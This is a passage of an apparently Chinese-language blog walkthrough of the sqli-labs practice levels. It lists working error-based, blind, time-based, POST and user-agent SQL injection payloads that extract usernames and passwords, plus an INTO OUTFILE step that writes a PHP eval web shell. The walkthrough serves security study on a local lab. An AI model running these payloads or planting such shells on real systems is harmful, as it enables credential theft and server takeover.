+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;<br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+<br><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>),0x7e),1) --+ <br><br>?<span class="hljs-attribute">id</span>=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>),0x7e),1) --+<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="7（文件写入-布尔盲注）"><a href="#7（文件写入-布尔盲注）" class="headerlink" title="7（文件写入&#x2F;布尔盲注）"></a>7（文件写入&#x2F;布尔盲注）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201052792.png" srcset="/img/loading.gif" lazyload alt="image-20250303205727884"></p>
+<p>测试（题目要求使用文件上传）</p>
+</li>
+<li><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250303210120634.png" srcset="/img/loading.gif" lazyload alt="image-20250303210120634"></p>
+<p>写入文件（仿照木马病毒）</p>
+</li>
+<li><p>先判断断点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201056146.png" srcset="/img/loading.gif" lazyload alt="image-20250303211010525"></p>
+<p>有3个断点</p>
+</li>
+<li><p>使用木马病毒的语句</p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs-master:82/Less-7/?id=1%27))union">http://sqli-labs-master:82/Less-7/?id=1&#39;))union</a> select 1,’<?php eval($_REQUEST[1])?>‘,3 into outfile “D:\software\phpstudy_pro\WWW\sqli-labs-master\Less-7\shell.php”– qwe</p>
+<p>(在文件夹less-7中出现shell.php文件 内容为<?php eval($_REQUEST[1])?>以及目标服务器的账户密码)</p>
+</li>
+<li><?php eval($_REQUEST[1])?><p>可以读取php代码，配合菜刀可以进入服务器</p>
+</li>
+</ul>
+<h2 id="8（布尔盲注）"><a href="#8（布尔盲注）" class="headerlink" title="8（布尔盲注）"></a>8（布尔盲注）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201100207.png" srcset="/img/loading.gif" lazyload alt="image-20250304125052559"></p>
+<p>  ’ 闭合（只显示正确，错误页面，<strong>布尔盲注</strong>）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
+
+<p>?id&#x3D;1’and length((select database()))&gt;&#x3D;<strong>5</strong>–+（猜库的长度）</p>
+<p>?id&#x3D;1’ and mid(database(),1,1)&#x3D;<strong>‘s’</strong>–+（猜库的名称）  </p>
+<p>（?id&#x3D;1’ and ascii(substr((select database()),1,1))&#x3D;115–+     <strong>115&#x3D;’s’）</strong></p>
+<p>?id&#x3D;1’ and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;<strong>‘security’</strong>),1,1))&gt;&#x3D;101–+</p>
+<p>（同理猜解出表名，列名）</p>
+<p>?id&#x3D;1’ and ascii(substr((select group_concat(<strong>username,password</strong>) from users),1,1))&#x3D;<strong>68</strong>–+（获取数据）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201104011.png" srcset="/img/loading.gif" lazyload alt="image-20250304130318563"></p>
+</li>
+</ul>
+<h2 id="9（时间注入）"><a href="#9（时间注入）" class="headerlink" title="9（时间注入）"></a>9（时间注入）</h2><ul>
+<li><p>无论输入什么都没有报错</p>
+<p>使用时间注入</p>
+</li>
+<li><p>判断类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201107729.png" srcset="/img/loading.gif" lazyload alt="image-20250304130800212"></p>
+<p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</p>
+<p>页面有时间延迟，则为真</p>
+</li>
+<li><p>剩余步骤同布尔盲注</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=1,sleep(5),1)--+<br>判断参数构造。<br><br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>判断数据库名长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>逐一判断数据库字符<br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>判断所有表名长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>逐一判断表名<br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>判断所有字段名的长度<br><br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>逐一判断字段名。<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>判断字段内容长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201112138.png" srcset="/img/loading.gif" lazyload alt="image-20250304131058553"></p>
+<p>?id&#x3D;1” and if(1&#x3D;1,sleep(5),1)–+</p>
+<p>双引号闭合</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=1,sleep(5),1)--+<br>判断参数构造。<br><br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>判断数据库名长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>逐一判断数据库字符<br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>判断所有表名长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>逐一判断表名<br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>判断所有字段名的长度<br><br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>逐一判断字段名。<br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>判断字段内容长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="11（post注入）"><a href="#11（post注入）" class="headerlink" title="11（post注入）"></a>11（post注入）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201116206.png" srcset="/img/loading.gif" lazyload alt="image-20250304131416520"></p>
+<p>写入1‘出现报错</p>
+</li>
+<li><p>抓包（相当于get，直接联合注入）</p>
+<p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250304133349636.png" srcset="/img/loading.gif" lazyload alt="image-20250304133349636"></p>
+<p>也可在username对话框<strong>直接写</strong>联合注入代码</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;or 1=1#<br>1&#x27; order by 3#<br>-1&#x27;  union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select ,version,database(,version#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>写入1”出现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201121578.png" srcset="/img/loading.gif" lazyload alt="image-20250304134337329"></p>
+<p>使用  “）进行闭合</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot; )or 1=1#<br>1&quot; ) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>#<br><span class="hljs-number">-1</span>&quot; ) union select 1,2#<br>-1&quot; ) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> ,<span class="hljs-keyword">version</span>,<span class="hljs-keyword">database</span>(,<span class="hljs-keyword">version</span>#<br><span class="hljs-number">-1</span>&quot; ) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security#<br>-1&quot; ) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&quot; ) union select 1,group_concat(username ,id , password) from user#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>写入1‘出现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201126096.png" srcset="/img/loading.gif" lazyload alt="image-20250304134416401"></p>
+<p>使用  ‘）进行闭合</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; )<span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; ) order by <span class="hljs-number">3</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> ,version,<span class="hljs-built_in">database</span>(,version#<br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=&#x27;security<span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users<span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(username ,id , password) from user<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>写入1”出现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201129817.png" srcset="/img/loading.gif" lazyload alt="image-20250304134458284"></p>
+<p>只使用双引号</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot;or 1=1#<br>1&quot; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>#<br><span class="hljs-number">-1</span>&quot; union select 1,2#<br>-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> ,<span class="hljs-keyword">version</span>,<span class="hljs-keyword">database</span>(,<span class="hljs-keyword">version</span>#<br><span class="hljs-number">-1</span>&quot; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security#<br>-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&quot; union select 1,group_concat(username ,id , password) from user#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="15-post布尔注入"><a href="#15-post布尔注入" class="headerlink" title="15(post布尔注入)"></a>15(post布尔注入)</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201138247.png" srcset="/img/loading.gif" lazyload alt="image-20250304202410979"></p>
+<p>1’ or 1&#x3D;1#</p>
+<p>无反馈，使用布尔盲注</p>
+<p>uname&#x3D;     相关代码   &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#(判断闭合符号)<br><span class="hljs-attribute">1</span>&#x27; or length(database())&gt;<span class="hljs-number">7</span>#（猜数据库长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>#（猜数据库名字）<br><span class="hljs-attribute">1</span>&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span>#（猜表名长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">116</span>#（猜表名名字）<br><span class="hljs-attribute">1</span>&#x27; or (length((select column_name from information_schema.columns where table_schema=database() and table_name=<span class="hljs-string">&quot;users&quot;</span>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">1</span>#（猜列名长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=<span class="hljs-string">&quot;users&quot;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">116</span>#（猜列名名字）<br><span class="hljs-attribute">1</span>&#x27; or length((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">3</span>#（猜数据长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">67</span>#（猜数据名字）<br><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201140608.png" srcset="/img/loading.gif" lazyload alt="image-20250304212902595"></p>
+<p><strong>双引号+括号</strong>进行闭合</p>
+</li>
+<li><p>uname&#x3D;     相关代码        &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot;) or 1=1#(判断闭合符号)<br>1&quot;) <span class="hljs-keyword">or</span> length(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">7</span>#（猜数据库长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr(database(),1,1))&gt;114#（猜数据库名字）<br>1&quot;) <span class="hljs-keyword">or</span> length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span>#（猜表名长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）<br>1&quot;) <span class="hljs-keyword">or</span> (length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;users&quot;<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">1</span>#（猜列名长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）<br>1&quot;) <span class="hljs-keyword">or</span> length((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">3</span>#（猜数据长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><ul>
+<li><p>题目提示修改密码<br>抓包之后还是post型</p>
+<p>所以使用passd进行测试</p>
+</li>
+<li><p>根据源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201143027.png" srcset="/img/loading.gif" lazyload alt="image-20250304220832488"></p>
+<p>表明：uname只能是<strong>库名</strong></p>
+<p>​			使用passd注入</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201144214.png" srcset="/img/loading.gif" lazyload alt="image-20250304220949627"></p>
+<p>uname&#x3D;admin</p>
+<p>passd&#x3D;1’  出现报错</p>
+<p>使用报错注入</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201145243.png" srcset="/img/loading.gif" lazyload alt="image-20250304221231893"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin<br><br><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(SELECT database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) #<br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201146678.png" srcset="/img/loading.gif" lazyload alt="image-20250305185702069"></p>
+<p>提示user agent</p>
+<p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250305185740234.png" srcset="/img/loading.gif" lazyload alt="image-20250305185740234"></p>
+<p>源代码将uname&amp;passwd都使用check_input函数</p>
+</li>
+<li><p>注入ua</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201148030.png" srcset="/img/loading.gif" lazyload alt="image-20250305190437037"></p>
+<p>提示闭合 为单引号</p>
+</li>
+<li><p>报错注入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><ul>
